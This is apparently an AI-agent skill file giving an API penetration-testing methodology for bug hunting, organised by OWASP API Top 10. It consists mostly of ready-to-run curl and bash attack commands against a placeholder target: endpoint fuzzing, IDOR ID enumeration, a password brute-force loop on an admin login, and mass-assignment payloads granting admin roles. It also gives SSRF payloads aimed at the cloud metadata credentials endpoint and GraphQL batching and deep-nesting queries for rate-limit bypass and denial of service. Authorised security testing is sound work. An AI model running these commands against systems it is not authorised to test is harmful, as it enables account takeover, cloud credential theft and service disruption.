---
name: api-testing
description: API security testing methodology covering OWASP API Security Top 10. Use when testing REST, GraphQL, or gRPC endpoints. Covers BOLA/IDOR, mass assignment, injection, SSRF, broken auth, and rate limiting. Includes specific payloads and tool usage for each class.
---

# API Security Testing

## API Discovery
```bash
# Common API paths
ffuf -u https://TARGET.COM/api/FUZZ -w C:/Users/S3ck1llr/bughunting-rig/hunting/wordlists/api-endpoints.txt -mc 200,401,403

# Swagger/OpenAPI docs
for path in /swagger.json /swagger/v1/swagger.json /api-docs /v1/api-docs /v2/api-docs /openapi.json /openapi/v1/openapi.json /.well-known/openapi; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://TARGET.COM$path")
  [ "$code" = "200" ] && echo "FOUND: $path"
done

# GraphQL introspection
curl -s -X POST https://TARGET.COM/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name,fields{name}}}}"}' | jq . > tmp/graphql-schema.json
```

## API1: BOLA/IDOR (Broken Object Level Authorization)
```bash
# Test with different user IDs
curl -s https://TARGET.COM/api/users/123/profile -H "Auth: TOKEN_A"  # User A
curl -s https://TARGET.COM/api/users/456/profile -H "Auth: TOKEN_A"  # Try User B's ID

# Iterate IDs
for i in $(seq 1 500); do
  resp=$(curl -s -o /dev/null -w "%{http_code}" "https://TARGET.COM/api/users/$i/profile" -H "Auth: TOKEN")
  [ "$resp" = "200" ] && echo "IDOR: $i accessible"
done

# UUID predictable? If sequential, try nearby UUIDs
# If random, check if ID is leaked in other endpoints
```

## API2: Broken Authentication
```bash
# Brute force login (check rate limiting)
for pass in password123 admin123 letmein 123456 qwerty; do
  resp=$(curl -s -o /dev/null -w "%{http_code}" -X POST https://TARGET.COM/api/login \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"admin@target.com\",\"password\":\"$pass\"}")
  echo "$pass: $resp"
done

# Token handling
# Check if tokens expire
# Check if tokens can be reused after logout
# Check if JWT has weak secret (jwt_tool)
# Check if refresh tokens are properly invalidated
```

## API3: Mass Assignment
```bash
# Registration with extra fields
curl -X POST https://TARGET.COM/api/register \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"test123","role":"admin"}'

# Profile update with extra fields
curl -X PUT https://TARGET.COM/api/users/me \
  -H "Content-Type: application/json" \
  -H "Auth: TOKEN" \
  -d '{"name":"test","isAdmin":true,"permissions":["admin"]}'

# Fields to test:
# role, admin, is_admin, isAdmin, permissions, access_level,
# user_type, group, department, superuser, root
```

## API4: Unrestricted Resource Consumption
```bash
# Rate limit test
for i in $(seq 1 100); do
  curl -s -o /dev/null -w "%{http_code} " https://TARGET.COM/api/data
  [ $((i % 10)) -eq 0 ] && echo ""
done

# Pagination abuse
curl -s "https://TARGET.COM/api/items?limit=999999" -H "Auth: TOKEN"
curl -s "https://TARGET.COM/api/items?offset=0&limit=10000" -H "Auth: TOKEN"
```

## API5: Broken Function Level Authorization
```bash
# Admin endpoints as regular user
curl -s https://TARGET.COM/api/admin/users -H "Auth: USER_TOKEN"
curl -s https://TARGET.COM/api/admin/settings -H "Auth: USER_TOKEN"

# Method override
curl -X DELETE https://TARGET.COM/api/users/123 \
  -H "X-HTTP-Method-Override: DELETE" \
  -H "Auth: USER_TOKEN"

# Try different HTTP methods
for method in GET POST PUT PATCH DELETE OPTIONS; do
  resp=$(curl -s -o /dev/null -w "%{http_code}" -X $method https://TARGET.COM/api/admin/users -H "Auth: USER_TOKEN")
  echo "$method: $resp"
done
```

## API6: Mass Assignment (Client-side)
```bash
# Modify hidden fields in client
# Intercept registration/profile update requests
# Add fields not shown in UI:
{
  "email": "user@test.com",
  "password": "test123",
  "verified": true,
  "email_confirmed": true,
  "subscription_tier": "enterprise",
  "credits": 999999
}
```

## API7: SSRF via API
```bash
# URL parameters that fetch resources
curl -X POST https://TARGET.COM/api/import \
  -H "Content-Type: application/json" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/"}'

curl -X POST https://TARGET.COM/api/fetch \
  -H "Content-Type: application/json" \
  -d '{"webhook_url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'
```

## API8: Improper Assets Management
```bash
# Old API versions
for v in v1 v2 v3 v4; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://TARGET.COM/api/$v/users")
  echo "$v: $code"
done

# Hidden API paths
cat tmp/all-urls.txt | grep -iE '/api/|/v\d/' | sort -u

# Check if old versions have weaker auth
```

## GraphQL-Specific Testing
```bash
# Introspection (if enabled)
curl -X POST https://TARGET.COM/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"query{__schema{queryType{name}mutationType{name}types{name kind fields{name type{name kind}}}}}"}'

# Query batching (rate limit bypass)
curl -X POST https://TARGET.COM/graphql \
  -H "Content-Type: application/json" \
  -d '[{"query":"{user(id:1){email}}"},{"query":"{user(id:2){email}}"},{"query":"{user(id:3){email}}"}]'

# Depth limiting bypass
# Try nested queries to cause DoS
query{user{friends{friends{friends{friends{email}}}}}}

# Field suggestion attack (if enabled)
query{__type(name:"User"){fields{name}}}
```
